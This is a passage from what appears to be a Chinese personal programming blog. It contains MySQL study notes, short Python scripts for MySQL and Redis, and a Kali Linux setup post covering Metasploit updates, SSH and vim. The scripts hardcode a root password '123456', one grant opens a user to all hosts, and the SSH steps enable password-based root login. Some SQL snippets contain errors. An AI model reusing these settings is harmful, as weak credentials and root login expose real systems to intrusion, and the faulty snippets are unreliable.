<p>– SELECT stuname, stuid from tb_student where stuname=’张三丰’;</p>
<p>– 7. 创建索引提高性能（负向查询无效，模糊查询%在前无效）</p>
<p>– 索引可以加速查询所以应该在经常用于查询筛选条件的列上建立索引</p>
<p>– 索引会使用额外的存储空间而且会让增删改变得更慢（因为要更新索引），不能滥用</p>
<p>– creat index idx_student_stuname on tb_student (stuname);</p>
<p>– drop index idx_student_stuname on tb_student;</p>
<p>– 8. 视图：查询的快照</p>
<p>– 通过视图可以将用户的访问权限限制到某些指定的列上</p>
<p>create view vw_stu_col as</p>
<p>SELECT stuid, stuname, colname from tb_student t1 inner join tb_college t2 on t1.colid=t2.colid;</p>
<p>select * from vw_stu_col;</p>
<p>select stuname,colname from vw_stu_col;</p>
<p>drop view vw_stu_col;</p>
<p>– 9.（存储）过程/函数：把一系列的SQL可以封装到一个过程中，而且可以加上分支和循环，将来通过过程的名字直接调用过程即可，因为创建过程时已经提前编译了SQL语句，所以比直接执行SQL语句性能更好。</p>
<p>– 重新定义定界符为$$(默认定界符”;” “\g”)</p>
<p>delimiter $$</p>
<p>– 创建存储过程</p>
<p>create procedure sp_cou_avg_scmark(in id int, out avgscmark float) </p>
<p>begin </p>
<p>select avg(scmark) into avgscmark from tb_score where couid=id; </p>
<p>end$$</p>
<p>– 将定界符还原回;</p>
<p>delimiter ;</p>
<p>– 调用存储过程</p>
<p>call sp_cou_avg_scmark(2222, @m);</p>
<p>– 通过输出参数取出学院平均成绩</p>
<p>select @m;</p>
<p>– 删除存储过程</p>
<p>drop procedure sp_col_avg_score;</p>
<p>– 触发器：(一般不用)在执行增删改操作时可以触发其他的级联操作，但是有可能导致“锁表”现象，实际开发中应该尽量避免使用触发器</p>
<p>delete from tb_course where couid=1111;</p>
<p>update tb_course set couid=1010 where couid=1111;</p>
<p>delimiter $$</p>
<p>create trigger tr_course_update</p>
<p>after update on tb_course for each row</p>
<p>begin</p>
<p>​    update tb_student set couid=new.couid where couid=old.couid;</p>
<p>end$$</p>
<p>delimiter ;</p>
<p>drop trigger tr_course_update;</p>
<h2 id="–-DCL-授予权限（grant-to）和召回权限-revoke-from"><a href="#–-DCL-授予权限（grant-to）和召回权限-revoke-from" class="headerlink" title="– DCL: 授予权限（grant to）和召回权限(revoke from)"></a>– DCL: 授予权限（grant to）和召回权限(revoke from)</h2><p>create user ‘hellokitty‘@’%’ identified by ‘123123’;</p>
<p>grant all privileges on school.* to ‘hellokitty‘@’%’;</p>
<p>revoke insert, delete, update on school.* from ‘hellokitty‘@’%’;</p>
<p>– drop user ‘hellokitty‘@’%’;</p>
<h2 id="–-事务（transaction）-把多个增删改的操作做成不可分割的原子性操作"><a href="#–-事务（transaction）-把多个增删改的操作做成不可分割的原子性操作" class="headerlink" title="– 事务（transaction）- 把多个增删改的操作做成不可分割的原子性操作"></a>– 事务（transaction）- 把多个增删改的操作做成不可分割的原子性操作</h2><p>– 要么全部都做，要么全都不做</p>
<p>– start tansaction;</p>
<p>begin;</p>
<p>delete from tb_student;</p>
<p>– 提交（事务中的所有操作全都生效）</p>
<p>commit;</p>
<p>– 回滚（事务中的所有操作全部撤销）</p>
<p>rollback;</p>
<p>CREATE TABLE products (</p>
<p>id int auto_increment comment ‘编号’,</p>
<p>num INT NOT NULL COMMENT ‘商品编号’,</p>
<p>pname VARCHAR (20) NOT NULL COMMENT ‘品名’,</p>
<p>price INT NOT NULL COMMENT ‘价格’,</p>
<p>数量quantity INT NOT NULL COMMENT ‘数量’,</p>
<p>);</p>

      
    </div>

    
    
    
      <footer class="post-footer">
        <div class="post-eof"></div>
      </footer>
  </article>
  
  
  

      
  
  
  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
    <link itemprop="mainEntityOfPage" href="http://example.com/2022/08/17/python%E6%95%B0%E6%8D%AE%E5%BA%93%E6%93%8D%E4%BD%9C/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="/images/avatar.gif">
      <meta itemprop="name" content="Private">
      <meta itemprop="description" content="程序语言记录">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="PeacefulRace">
    </span>
      <header class="post-header">
        <h2 class="post-title" itemprop="name headline">
          
            <a href="/2022/08/17/python%E6%95%B0%E6%8D%AE%E5%BA%93%E6%93%8D%E4%BD%9C/" class="post-title-link" itemprop="url">python数据库操作</a>
        </h2>

        <div class="post-meta">
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-calendar"></i>
              </span>
              <span class="post-meta-item-text">发表于</span>

              <time title="创建时间：2022-08-17 10:16:24" itemprop="dateCreated datePublished" datetime="2022-08-17T10:16:24+08:00">2022-08-17</time>
            </span>
              <span class="post-meta-item">
                <span class="post-meta-item-icon">
                  <i class="far fa-calendar-check"></i>
                </span>
                <span class="post-meta-item-text">更新于</span>
                <time title="修改时间：2022-05-29 14:17:33" itemprop="dateModified" datetime="2022-05-29T14:17:33+08:00">2022-05-29</time>
              </span>
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-folder"></i>
              </span>
              <span class="post-meta-item-text">分类于</span>
                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
                  <a href="/categories/python/" itemprop="url" rel="index"><span itemprop="name">python</span></a>
                </span>
            </span>

          

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">

      
          <h1 id="ImportantNotes-txt"><a href="#ImportantNotes-txt" class="headerlink" title="ImportantNotes.txt"></a>ImportantNotes.txt</h1><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">修改pip安装源：</span><br><span class="line">在&quot;c:\users\***\pip\&quot;下创建&quot;pip.ini&quot;文件</span><br><span class="line">文件内写上：</span><br><span class="line">[global]</span><br><span class="line">index-url=https://pypi.doubanio.com/simple</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">查看依赖库版本：pip freeze / pip list</span><br><span class="line">安装指定版本依赖库：pip install ***==x.x.x</span><br><span class="line">生成所需依赖库txt文件：pip freeze &gt; requirements.txt</span><br><span class="line">根据已有依赖库txt文件安装库：pip install -r requirements.txt</span><br></pre></td></tr></table></figure>

<h1 id="哈希存储与哈希算法-py"><a href="#哈希存储与哈希算法-py" class="headerlink" title="哈希存储与哈希算法.py"></a>哈希存储与哈希算法.py</h1><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> hashlib</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">main</span>():</span><br><span class="line">    digester = hashlib.md5()</span><br><span class="line">    <span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&#x27;Python-3.9.5.tar.xz&#x27;</span>, <span class="string">&#x27;rb&#x27;</span>) <span class="keyword">as</span> file_stream:</span><br><span class="line">        file_iter = <span class="built_in">iter</span>(<span class="keyword">lambda</span>: file_stream.read(<span class="number">1024</span>), <span class="string">b&#x27;&#x27;</span>)</span><br><span class="line">        <span class="keyword">for</span> data <span class="keyword">in</span> file_iter:</span><br><span class="line">            digester.update(data)</span><br><span class="line"></span><br><span class="line">        <span class="comment"># data = file_stream.read(1024)</span></span><br><span class="line">        <span class="comment"># while data:</span></span><br><span class="line">        <span class="comment">#     digester.update(data)</span></span><br><span class="line">        <span class="comment">#     data = file_stream.read(1024)</span></span><br><span class="line">    <span class="built_in">print</span>(digester.hexdigest())</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    main()</span><br></pre></td></tr></table></figure>

<h1 id="向表中增加删除数据-py"><a href="#向表中增加删除数据-py" class="headerlink" title="向表中增加删除数据.py"></a>向表中增加删除数据.py</h1><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> pymysql</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">main</span>():</span><br><span class="line">    no = <span class="built_in">int</span>(<span class="built_in">input</span>(<span class="string">&#x27;The teaid need to delete: &#x27;</span>))</span><br><span class="line">    <span class="comment"># 1.创建连接对象</span></span><br><span class="line">    conn = pymysql.connect(host=<span class="string">&#x27;192.168.0.5&#x27;</span>, port=<span class="number">3306</span>, user=<span class="string">&#x27;root&#x27;</span>,</span><br><span class="line">                           password=<span class="string">&#x27;123456&#x27;</span>, db=<span class="string">&#x27;school&#x27;</span>, charset=<span class="string">&#x27;utf8&#x27;</span>)</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        <span class="comment"># 2.获得游标对象</span></span><br><span class="line">        <span class="keyword">with</span> conn.cursor() <span class="keyword">as</span> cursor:</span><br><span class="line">            <span class="comment"># 3.执行SQL得到结果</span></span><br><span class="line">            result = cursor.execute(</span><br><span class="line">                <span class="string">&#x27;delete from tb_teacher where teaid=%s&#x27;</span>, (no, ))</span><br><span class="line">                <span class="comment"># &#x27;insert into tb_teacher values (1155, &quot;张翠山&quot;, &quot;教授&quot;, 3)&#x27;)</span></span><br><span class="line">            <span class="keyword">if</span> result == <span class="number">1</span>:</span><br><span class="line">                <span class="built_in">print</span>(<span class="string">&#x27;Operate success!&#x27;</span>)</span><br><span class="line">            <span class="comment"># 4.操作成功执行提交</span></span><br><span class="line">            conn.commit()</span><br><span class="line">    <span class="keyword">except</span> pymysql.MySQLError <span class="keyword">as</span> error:</span><br><span class="line">        <span class="built_in">print</span>(error)</span><br><span class="line">        <span class="comment"># 5.操作失败执行回滚</span></span><br><span class="line">        conn.rollback()</span><br><span class="line">    <span class="keyword">finally</span>:</span><br><span class="line">        <span class="comment"># 6.关闭连接释放资源</span></span><br><span class="line">        conn.close()</span><br><span class="line"></span><br><span class="line">        <span class="comment"># print(conn)</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    main()</span><br></pre></td></tr></table></figure>

<h1 id="向表中更新数据-py"><a href="#向表中更新数据-py" class="headerlink" title="向表中更新数据.py"></a>向表中更新数据.py</h1><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> pymysql</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">main</span>():</span><br><span class="line">    no = <span class="built_in">int</span>(<span class="built_in">input</span>(<span class="string">&#x27;The teaid need to update: &#x27;</span>))</span><br><span class="line">    title = <span class="built_in">input</span>(<span class="string">&#x27;new title: &#x27;</span>)</span><br><span class="line">    <span class="comment"># 1.创建连接对象</span></span><br><span class="line">    conn = pymysql.connect(host=<span class="string">&#x27;192.168.0.5&#x27;</span>, port=<span class="number">3306</span>, user=<span class="string">&#x27;root&#x27;</span>,</span><br><span class="line">                           password=<span class="string">&#x27;123456&#x27;</span>, db=<span class="string">&#x27;school&#x27;</span>, charset=<span class="string">&#x27;utf8&#x27;</span>)</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        <span class="comment"># 2.获得游标对象</span></span><br><span class="line">        <span class="keyword">with</span> conn.cursor() <span class="keyword">as</span> cursor:</span><br><span class="line">            <span class="comment"># 3.执行SQL得到结果</span></span><br><span class="line">            result = cursor.execute(</span><br><span class="line">                <span class="string">&#x27;update tb_teacher set teatitle=%s where teaid=%s&#x27;</span>, (title, no))</span><br><span class="line">                <span class="comment"># &#x27;insert into tb_teacher values (1155, &quot;张翠山&quot;, &quot;教授&quot;, 3)&#x27;)</span></span><br><span class="line">            <span class="keyword">if</span> result == <span class="number">1</span>:</span><br><span class="line">                <span class="built_in">print</span>(<span class="string">&#x27;Operate success!&#x27;</span>)</span><br><span class="line">            <span class="comment"># 4.操作成功执行提交</span></span><br><span class="line">            conn.commit()</span><br><span class="line">    <span class="keyword">except</span> pymysql.MySQLError <span class="keyword">as</span> error:</span><br><span class="line">        <span class="built_in">print</span>(error)</span><br><span class="line">        <span class="comment"># 5.操作失败执行回滚</span></span><br><span class="line">        conn.rollback()</span><br><span class="line">    <span class="keyword">finally</span>:</span><br><span class="line">        <span class="comment"># 6.关闭连接释放资源</span></span><br><span class="line">        conn.close()</span><br><span class="line"></span><br><span class="line">        <span class="comment"># print(conn)</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    main()</span><br></pre></td></tr></table></figure>

<h1 id="MySQL的select操作-py"><a href="#MySQL的select操作-py" class="headerlink" title="MySQL的select操作.py"></a>MySQL的select操作.py</h1><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> pymysql</span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Teacher</span>(<span class="title class_ inherited__">object</span>):</span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__init__</span>(<span class="params">self, no, name, title</span>):</span><br><span class="line">        self.no = no</span><br><span class="line">        self.name = name</span><br><span class="line">        self.title = title</span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__str__</span>(<span class="params">self</span>):</span><br><span class="line">        <span class="keyword">return</span> <span class="string">f&#x27;<span class="subst">&#123;self.no&#125;</span>\t<span class="subst">&#123;self.name&#125;</span>\t<span class="subst">&#123;self.title&#125;</span>&#x27;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">main</span>():</span><br><span class="line">    <span class="comment"># 1.创建连接对象</span></span><br><span class="line">    conn = pymysql.connect(host=<span class="string">&#x27;192.168.0.5&#x27;</span>, port=<span class="number">3306</span>, user=<span class="string">&#x27;root&#x27;</span>,</span><br><span class="line">                           password=<span class="string">&#x27;123456&#x27;</span>, db=<span class="string">&#x27;school&#x27;</span>, charset=<span class="string">&#x27;utf8&#x27;</span>,</span><br><span class="line">                           cursorclass=pymysql.cursors.DictCursor) <span class="comment"># 字典型游标</span></span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        <span class="comment"># 2.获得游标对象</span></span><br><span class="line">        <span class="keyword">with</span> conn.cursor() <span class="keyword">as</span> cursor:</span><br><span class="line">            <span class="comment"># 3.执行SQL得到结果</span></span><br><span class="line">            cursor.execute(<span class="string">&#x27;select teaid as no, teaname as name, &#x27;</span></span><br><span class="line">                           <span class="string">&#x27;teatitle as title from tb_teacher&#x27;</span>)</span><br><span class="line">            <span class="comment"># print(cursor.fetchone())</span></span><br><span class="line">            <span class="comment"># print(cursor.fetchmany(2))</span></span><br><span class="line">            <span class="comment"># print(cursor.fetchall())</span></span><br><span class="line">            <span class="keyword">for</span> row <span class="keyword">in</span> cursor.fetchall():</span><br><span class="line">                teacher = Teacher(**row)</span><br><span class="line">                <span class="built_in">print</span>(teacher)</span><br><span class="line">                <span class="comment"># print(row[&#x27;no&#x27;], end=&#x27;\t&#x27;)</span></span><br><span class="line">                <span class="comment"># print(row[&#x27;name&#x27;], end=&#x27;\t&#x27;)</span></span><br><span class="line">                <span class="comment"># print(row[&#x27;title&#x27;])</span></span><br><span class="line">                <span class="comment"># print(f&#x27;teaid: &#123;row[0]&#125;&#x27;)</span></span><br><span class="line">                <span class="comment"># print(f&#x27;teaname: &#123;row[1]&#125;&#x27;)</span></span><br><span class="line">                <span class="comment"># print(f&#x27;teatitle: &#123;row[2]&#125;&#x27;)</span></span><br><span class="line">                <span class="comment"># print(&#x27;-&#x27;*20)</span></span><br><span class="line">    <span class="keyword">except</span> pymysql.MySQLError <span class="keyword">as</span> error:</span><br><span class="line">        <span class="built_in">print</span>(error)</span><br><span class="line">    <span class="keyword">finally</span>:</span><br><span class="line">        <span class="comment"># 6.关闭连接释放资源</span></span><br><span class="line">        conn.close()</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    main()</span><br></pre></td></tr></table></figure>

<h1 id="Python程序操作Redis-py"><a href="#Python程序操作Redis-py" class="headerlink" title="Python程序操作Redis.py"></a>Python程序操作Redis.py</h1><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> redis</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">main</span>():</span><br><span class="line">    client = redis.Redis(host=<span class="string">&#x27;192.168.0.5&#x27;</span>, port=<span class="number">6379</span>, password=<span class="string">&#x27;123456&#x27;</span>)</span><br><span class="line"></span><br><span class="line">    <span class="comment"># print(client)</span></span><br><span class="line">    client.<span class="built_in">set</span>(<span class="string">&#x27;username&#x27;</span>, <span class="string">&#x27;hellokitty&#x27;</span>, ex=<span class="number">300</span>)</span><br><span class="line">    <span class="built_in">print</span>(client.ttl(<span class="string">&#x27;username&#x27;</span>))</span><br><span class="line">    <span class="built_in">print</span>(client.get(<span class="string">&#x27;username&#x27;</span>).decode())</span><br><span class="line">    client.<span class="built_in">set</span>(<span class="string">&#x27;nickname&#x27;</span>, <span class="string">&#x27;洛&#x27;</span>)</span><br><span class="line">    <span class="built_in">print</span>(client.get(<span class="string">&#x27;nickname&#x27;</span>).decode())</span><br><span class="line">    client.<span class="built_in">set</span>(<span class="string">&#x27;yu&#x27;</span>, <span class="string">&#x27;300&#x27;</span>)</span><br><span class="line">    client.incr(<span class="string">&#x27;yu&#x27;</span>)</span><br><span class="line">    client.incrby(<span class="string">&#x27;yu&#x27;</span>, <span class="number">50</span>)</span><br><span class="line">    <span class="built_in">print</span>(client.get(<span class="string">&#x27;yu&#x27;</span>).decode())</span><br><span class="line">    client.hset(<span class="string">&#x27;stu1&#x27;</span>, <span class="string">&#x27;id&#x27;</span>, <span class="string">&#x27;1001&#x27;</span>)</span><br><span class="line">    client.hset(<span class="string">&#x27;stu1&#x27;</span>, <span class="string">&#x27;name&#x27;</span>, <span class="string">&#x27;chui&#x27;</span>)</span><br><span class="line">    <span class="built_in">print</span>(client.hgetall(<span class="string">&#x27;stu1&#x27;</span>))</span><br><span class="line">    <span class="built_in">print</span>(client.hget(<span class="string">&#x27;stu1&#x27;</span>, <span class="string">&#x27;name&#x27;</span>).decode())</span><br><span class="line">    client.rpush(<span class="string">&#x27;list1&#x27;</span>, <span class="number">10</span>, <span class="number">20</span>, <span class="number">30</span>, <span class="number">40</span>)</span><br><span class="line">    <span class="built_in">print</span>(client.lrange(<span class="string">&#x27;list1&#x27;</span>, <span class="number">0</span>, -<span class="number">1</span>))</span><br><span class="line"></span><br><span class="line"><span class="comment"># str</span></span><br><span class="line"><span class="comment"># bytes</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    main()</span><br><span class="line"></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">报错解决方法</span></span><br><span class="line"><span class="string">--no bind address ...</span></span><br><span class="line"><span class="string">redis-server --bind [C IP] &gt; redis.log &amp;</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br></pre></td></tr></table></figure>

      
    </div>

    
    
    
      <footer class="post-footer">
        <div class="post-eof"></div>
      </footer>
  </article>
  
  
  

      
  
  
  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
    <link itemprop="mainEntityOfPage" href="http://example.com/2022/08/17/kali-Linux/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="/images/avatar.gif">
      <meta itemprop="name" content="Private">
      <meta itemprop="description" content="程序语言记录">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="PeacefulRace">
    </span>
      <header class="post-header">
        <h2 class="post-title" itemprop="name headline">
          
            <a href="/2022/08/17/kali-Linux/" class="post-title-link" itemprop="url">kali-linux</a>
        </h2>

        <div class="post-meta">
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-calendar"></i>
              </span>
              <span class="post-meta-item-text">发表于</span>

              <time title="创建时间：2022-08-17 10:16:24" itemprop="dateCreated datePublished" datetime="2022-08-17T10:16:24+08:00">2022-08-17</time>
            </span>
              <span class="post-meta-item">
                <span class="post-meta-item-icon">
                  <i class="far fa-calendar-check"></i>
                </span>
                <span class="post-meta-item-text">更新于</span>
                <time title="修改时间：2022-05-30 11:11:23" itemprop="dateModified" datetime="2022-05-30T11:11:23+08:00">2022-05-30</time>
              </span>
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-folder"></i>
              </span>
              <span class="post-meta-item-text">分类于</span>
                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
                  <a href="/categories/linux/" itemprop="url" rel="index"><span itemprop="name">linux</span></a>
                </span>
            </span>

          

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">

      
          <h1 id="kali-Linux-环境安装"><a href="#kali-Linux-环境安装" class="headerlink" title="kali Linux_环境安装"></a>kali Linux_环境安装</h1><h2 id="Kali-系统更新"><a href="#Kali-系统更新" class="headerlink" title="Kali****系统更新"></a><strong>Kali****系统更新</strong></h2><p>——选择不更新Metasploit</p>
<p>\1.  查看当前系统中所有软件包状态</p>
<p>sudo dpkg -get-selections | more</p>
<p>可以找到metasploit-framework软件包名为“Metasploit-framework”</p>
<p>\2.  给metasploit-framework锁定当前版本不更新</p>
<p>sudo apt-mark hold Metasploit-framework</p>
<p>\3.  查看当前已锁定的软件包</p>
<p>sudo dpkg –get-selections | grep hold</p>
<p>\4.  取消软件保留设置</p>
<p>sudo apt-mark unhold Metasploit-framework</p>
<p>——kali系统更新后出现的问题</p>
<p>​    进入/usr/share/Metasploit-framework   目录下使用命令</p>
<p>​    gem install bundler</p>
<p>​    gem update –system</p>
<p>​    然后成功启动</p>
<h2 id="SSH-系统服务"><a href="#SSH-系统服务" class="headerlink" title="SSH****系统服务"></a><strong>SSH****系统服务</strong></h2><p>——SSH服务简介：</p>
<p>​    SSH服务是目前较可靠，专为远程登录服务器和其他网络服务提供安全性的协议。</p>
<p>​    SSH是标准的网络协议，可用于大多数UNIX操作系统，能够实现字符界面的远程登陆管理，它默认使用22号端口，采用密文的形式在网络中传输数据，相对于通过明文传输的Telnet，具有更高的安全性。</p>
<p>​    SSH提供了口令和密钥两种用户验证方式，这两者都是通过密文传输数据的。</p>
<p>​    SSH对我们的主要作用是：能够操作远程服务器系统。</p>
<p>——配置流程</p>
<p>1.使用编辑器打开ssh配置</p>
<p>leafpad /etc/ssh/ssh_config</p>
<p>​    搜索：</p>
<p>​        #PasswordAuthentication yes                     (去掉注释)</p>
<p>​       #PermitRootLogin prohibit-password              （去掉注释后面的并删除改为yes）</p>
<p>​    2.使用命令行模式开启SSH服务</p>
<p>​       service ssh start</p>
<p>​    3.查看服务开启状态</p>
<p>​       service ssh status</p>
<p>\5.  登录测试</p>
<p>使用xshell、putty等工具测试</p>
<h2 id="Kali-工具包简介"><a href="#Kali-工具包简介" class="headerlink" title="Kali****工具包简介"></a><strong>Kali****工具包简介</strong></h2><p>kali Linux含有可用于渗透测试的各种工具，这些工具程序大体可以分为以下几类。</p>
<p>\1.  信息收集：这类工具主要用来帮助我们收集目标的网络架构、网站脚本语言、网站信息泄露等。</p>
<p>\2.  漏洞评估：这类工具都可以扫描目标系统上的漏洞，扫描主机漏洞，系统漏洞。</p>
<p>\3.  漏洞利用：这类工具可以利用在目标系统中发现的漏洞，让我们针对性的去利用攻击。</p>
<p>\4.  Web应用：即与Web应用有关的工具，关于web方面的扫描器、爆破等工具</p>
<p>\5.  密码攻击：提供在线密码破解或者是离线的密码破解工具给我们使用</p>
<h2 id="什么是shell"><a href="#什么是shell" class="headerlink" title="什么是shell"></a><strong>什么是shell</strong></h2><p>——了解什么是shell</p>
<p>​    在计算机科学中，shell俗称外壳（用来区别于内核），它类似于windows的DOS，能够接收用户的命令并翻译给操作系统执行，是用户与操作系统（内核）之间的桥梁。</p>
<p>​    查看系统支持哪些shell:</p>
<p>​       cat /etc/shells</p>
<p>​    查看正在使用的shell:</p>
<p>​       echo $SHELL</p>
<p>​    shell与终端的区别：</p>
<p>​       终端：接收用户的输入，并传递给shell程序，接收程序输出并展示到屏幕.</p>
<p>shell：接收并解析用户的命令给操作系统执行，将结果输出到终端。</p>
<h2 id="vim-编辑器"><a href="#vim-编辑器" class="headerlink" title="vim****编辑器"></a><strong>vim****编辑器</strong></h2><p>——vi/vim编辑器模式</p>
<p>​    命令模式（默认）：刚进入vim的时候，默认就是命令模式，可以复制行删除行等。</p>
<p>​    输入模式：可以输入内容。</p>
<p>——模式转换</p>
<p>​    使用insert键切换进入输入模式：命令模式à输入模式</p>
<p>​    i：在当前光标所在字符的前面，转为输入模式</p>
<p>​    I：在当前光标所在行的行首转换为输入模式</p>
<p>​    a：在当前光标所在字符的后面，转换为输入模式</p>
<p>​    A：在光标所在行的行尾，转换为输入模式</p>
<p>​    o：在当前光标所在行的下方，新建一行，并转换为输入模式</p>
<p>​    O：在当前光标所在行的上方，新建一行，并转换为输入模式</p>
<p>​    s：删除光标所在字符</p>
<p>​    r：替换光标处字符</p>
<p>——键入模式à命令模式</p>
<p>​    ESC键</p>
<p>——关闭保存文件</p>
<p>​    shift键+:号</p>
<p>​    命令模式下：</p>
<p>​    w：保存</p>
<p>​    q：退出</p>
<p>​    wq和x都是保存退出</p>
<p>​    q!：强制退出</p>
<p>​    w!：强制保存，管理员才有权限</p>
<p>——查找</p>
<p>​    普通模式：</p>
<p>​    /PATTERN：从当前位置向后查找</p>
<p>​    ? PATTERN：从当前位置向前查找</p>
<h2 id="Linux-常用命令"><a href="#Linux-常用命令" class="headerlink" title="Linux****常用命令"></a><strong>Linux****常用命令</strong></h2><p><strong>查找Linux命令：<a target="_blank" rel="noopener" href="http://linux.51yip.com/">http://linux.51yip.com/</a></strong></p>
<p>echo命令：</p>
<p>​    echo命令用于在终端输出字符串或变量提取后的值，格式为“echo [字符串 | $变量]”。</p>
<p>date命令：</p>
